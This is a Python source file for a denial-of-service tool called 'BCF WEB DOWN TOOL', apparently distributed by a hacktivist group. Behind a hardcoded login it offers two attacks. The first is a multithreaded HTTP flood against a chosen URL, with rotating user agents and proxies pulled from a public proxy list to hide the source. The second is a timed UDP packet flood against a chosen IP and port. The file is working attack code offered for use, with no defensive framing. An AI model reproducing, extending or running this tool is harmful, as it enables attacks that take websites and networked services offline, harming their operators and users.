# File: bcf-web-crash.py (Updated and Fixed)

import os, time, threading, requests, random, socket
from colorama import Fore, Style, init
init(autoreset=True)

def login():
    os.system("clear")
    print(Fore.CYAN + "Login to BCF WEB TOOL")
    user = input("Username: ")
    passwd = input("Password: ")
    if user == "BCF" and passwd == "BCF2019":
        print(Fore.GREEN + "\nLogin successful!")
        time.sleep(1)
        menu()
    else:
        print(Fore.RED + "Wrong credentials!")
        time.sleep(1)
        login()

def banner():
    os.system("clear")
    print(Fore.RED + Style.BRIGHT + """
███████  ██████  ███████      ██     ██ ███████ ██████  
██      ██      ██    ██     ██     ██ ██      ██   ██ 
███████ ██      ███████     ██  █  ██ █████   ██████  
      ██ ██      ██          ██ ███ ██ ██      ██   ██ 
███████  ██████ ██           ███ ███  ███████ ██   ██ 
    """)
    print(Fore.YELLOW + Style.BRIGHT + "               BCF WEB DOWN TOOL")

def load_proxies():
    print(Fore.CYAN + "Loading proxies...")
    try:
        res = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt")
        if res.status_code == 200:
            proxy_list = res.text.strip().split('\n')
            return proxy_list if proxy_list else [None]
        else:
            print(Fore.RED + "[!] Failed to get proxy list.")
            return [None]
    except:
        print(Fore.RED + "[!] Exception while loading proxies.")
        return [None]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

def http_flood(url, proxy=None):
    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            proxies_dict = {"http": proxy, "https": proxy} if proxy else None
            r = requests.get(url, headers=headers, proxies=proxies_dict, timeout=5)
            print(Fore.GREEN + f"[HTTP {r.status_code}] {proxy or 'No Proxy'}")
        except:
            print(Fore.RED + f"[HTTP FAIL] {proxy or 'No Proxy'}")

def udp_flood(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1024)
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            client.sendto(bytes_data, (target, port))
            print(Fore.MAGENTA + f"[UDP] Sent packet to {target}:{port}")
        except:
            print(Fore.RED + f"[UDP FAIL] Packet to {target}:{port}")

def web_down():
    url = input(Fore.CYAN + "Target URL (include https://): ")
    threads = int(input("Number of Threads: "))
    use_proxy = input("Use proxies? (y/n): ").lower()
    proxies = load_proxies() if use_proxy == 'y' else [None]
    print(Fore.YELLOW + "Launching HTTP Flood...")
    for _ in range(threads):
        proxy = random.choice(proxies)
        threading.Thread(target=http_flood, args=(url, proxy), daemon=True).start()
    input(Fore.YELLOW + "\nPress Enter to stop...\n")

def udp_menu():
    ip = input(Fore.CYAN + "Target IP Address: ")
    port = int(input("Port: "))
    duration = int(input("Duration in seconds: "))
    print(Fore.YELLOW + "Launching UDP Flood...")
    threading.Thread(target=udp_flood, args=(ip, port, duration), daemon=True).start()
    time.sleep(duration)
    print(Fore.GREEN + "UDP Flood finished.")

def menu():
    while True:
        banner()
        print(Fore.CYAN + """
1. WEB DOWN (HTTP Flood)
2. UDP FLOOD
3. FACEBOOK PAGE
4. EXIT
""")
        choice = input(Fore.YELLOW + "Select Option: ")
        if choice == "1":
            web_down()
        elif choice == "2":
            udp_menu()
        elif choice == "3":
            print(Fore.BLUE + "Opening Facebook page...")
            os.system("xdg-open https://www.facebook.com/BangladeshCivilianForce369")
        elif choice == "4":
            print(Fore.GREEN + "Thanks for using BCF Tool!")
            break
        else:
            print(Fore.RED + "Invalid option!")

# Start the tool
login()
